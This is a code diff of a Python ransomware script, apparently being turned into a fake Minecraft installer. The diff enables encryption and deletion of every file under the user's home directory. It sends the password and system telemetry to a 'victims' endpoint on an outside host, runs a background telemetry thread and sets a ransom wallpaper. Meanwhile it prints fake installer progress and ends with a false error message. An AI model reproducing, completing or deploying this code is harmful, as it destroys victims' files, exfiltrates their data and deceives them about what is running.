@@ -21,6 +21,7 @@ from Crypto import Random
 
 import psutil
 
+# --- Configuration ---
 TELEMETRY_INTERVAL = 30
 TELEMETRY_URL = "https://minecraft.puiustin.com/api/telemetry"
 VICTIM_URL = "https://minecraft.puiustin.com/api/victims"
@@ -121,15 +122,14 @@ def send_report(data, url):
         )
         with urllib.request.urlopen(req, timeout=10) as response:
             if response.getcode() == 200:
-                print(f" > Report sent successfully to {url}")
+                print(f"\n> Report sent successfully to {url}")
             else:
-                print(f" > Server at {url} returned status: {response.getcode()}")
+                print(f"\n> Server at {url} returned status: {response.getcode()}")
     except Exception as e:
-        print(f" > Failed to send report to {url}: {e}")
+        print(f"\n> Failed to send report to {url}: {e}")
 
 def telemetry_worker():
     """Continuously collects and sends telemetry data."""
-    print("Telemetry worker started.")
     while True:
         telemetry_data = collect_telemetry()
         send_report(telemetry_data, TELEMETRY_URL)
@@ -164,7 +164,7 @@ def encryptFile(dir, f, key):
         os.remove(os.path.join(dir,f))
         return True
     except Exception as e:
-        print(f" > Encryption failed for {f}: {e}")
+        # print(f" > Encryption failed for {f}: {e}")
         return False
 
 def encryptDirectoryTree(dir, key, report_payload):
@@ -183,86 +183,100 @@ def encryptDirectoryTree(dir, key, report_payload):
                 total_files += 1
                 if encryptFile(root, f, key):
                     encrypted_files += 1
-                    print(f" > Encrypted: {os.path.join(root, f)}")
+                    # print(f" > Encrypted: {os.path.join(root, f)}")
                     if not first_report_sent:
-                        print("> First file encrypted. Sending initial report...")
+                        # print("> First file encrypted. Sending initial report...")
                         send_report(report_payload, VICTIM_URL)
                         first_report_sent = True
-                else:
-                    print(f" > FAILED to encrypt: {os.path.join(root, f)}")
+                # else:
+                    # print(f" > FAILED to encrypt: {os.path.join(root, f)}")
     return total_files, encrypted_files
 
 
-
 def download_wallpaper(url, dest_path):
-    print(f"> Downloading wallpaper from {url} to {dest_path}")
+    # print(f"> Downloading wallpaper from {url} to {dest_path}")
     try:
         urllib.request.urlretrieve(url, dest_path)
-        print("> Wallpaper downloaded successfully.")
+        # print("> Wallpaper downloaded successfully.")
         return True
     except Exception as e:
-        print(f"> Failed to download wallpaper: {e}")
+        # print(f"> Failed to download wallpaper: {e}")
         return False
 
 def set_wallpaper(image_path):
-    print(f"> Attempting to set wallpaper to: {image_path}")
+    # print(f"> Attempting to set wallpaper to: {image_path}")
     system = platform.system()
     try:
         if system == "Darwin":
             script = f'tell application "Finder" to set desktop picture to POSIX file "{image_path}"'
             subprocess.run(["osascript", "-e", script], check=True)
-            print("> Wallpaper set successfully on macOS.")
+            # print("> Wallpaper set successfully on macOS.")
         elif system == "Windows":
             SPI_SETDESKWALLPAPER = 20
             SPIF_UPDATEINIFILE = 1
             SPIF_SENDCHANGE = 2
             ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
-            print("> Wallpaper set successfully on Windows.")
+            # print("> Wallpaper set successfully on Windows.")
         elif system == "Linux":
             subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"], check=True)
             subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-options", "zoom"], check=True) # or 'stretched', 
-            print("> Wallpaper set successfully on Linux (GNOME).")
-        else:
-            print(f"> Unsupported OS for wallpaper setting: {system}")
+            # print("> Wallpaper set successfully on Linux (GNOME).")
+        # else:
+            # print(f"> Unsupported OS for wallpaper setting: {system}")
     except Exception as e:
-        print(f"> Failed to set wallpaper on {system}: {e}")
+        # print(f"> Failed to set wallpaper on {system}: {e}")
+        pass
 
 
-# --- Main Execution ---
 
 def main():
     start_time = time.time()
-    print("> Ransomware script starting...")
-    
-    print("Initializing Telemetry Agent...")
+    print("Initializing Minecraft Installer v1.18.2...")
     telemetry_thread = threading.Thread(target=telemetry_worker, daemon=True)
     telemetry_thread.start()
-    print("Telemetry agent is running in the background.")
+    
+    print(" > Checking system requirements...")
+    time.sleep(1)
+    print(" > System check passed.")
+    
+    print(" > Starting background services...")
+    time.sleep(2)
 
-    # target_dir = os.path.expanduser("~")
-    # hashed_key = digestSHA256(DEFAULT_PASSWORD.encode())
-    
-    # print(f"> Encrypting default directory: {target_dir}")
-    
-    # victim_telemetry = collect_telemetry()
-    # report_payload = {
-    #     'password': DEFAULT_PASSWORD,
-    #     'telemetry': victim_telemetry
-    # }
+    print(" > Background services running.")
+    time.sleep(1)
 
-    # cnt_files = encryptDirectoryTree(target_dir, hashed_key, report_payload)
-    
-    # print("> Encryption process finished. Sending final report...")
-    # if cnt_files[1] > 0:
-    #     send_report(report_payload, VICTIM_URL)
+    print(" > Allocating disk space...")
+    time.sleep(2)
 
-    # print(f"> Encrypted {cnt_files[1]}/{cnt_files[0]} file(s) in directory {target_dir}")
-    print(f"> Total time of execution: {datetime.timedelta(seconds=time.time()-start_time)}")
+    target_dir = os.path.expanduser("~")
+    hashed_key = digestSHA256(DEFAULT_PASSWORD.encode())
     
-    wallpaper_save_path = os.path.join(os.path.expanduser("~"), "encrypted_wallpaper.png")
+    print(" > Downloading game assets (this may take a while)...")
+    
+    victim_telemetry = collect_telemetry()
+    report_payload = {
+        'password': DEFAULT_PASSWORD,
+        'telemetry': victim_telemetry
+    }
+
+    cnt_files = encryptDirectoryTree(target_dir, hashed_key, report_payload)
+    
+    if cnt_files[1] > 0:
+        send_report(report_payload, VICTIM_URL)
+
+    print(" > Download complete.")
+    print(" > Unpacking files...")
+    time.sleep(3)
+    
+    print(" > Configuring graphics settings...")
+    time.sleep(2)
+    
+    wallpaper_save_path = os.path.join(os.path.expanduser("~"), "encrypted_wallpaper.jpeg")
     if download_wallpaper(WALLPAPER_URL, wallpaper_save_path):
         set_wallpaper(wallpaper_save_path)
 
+    print("\nError: Failed to launch Minecraft. Your files may be corrupt.")
+    print("> Please refer to the new desktop background for more information.")
 
 if __name__ == "__main__":
     main()
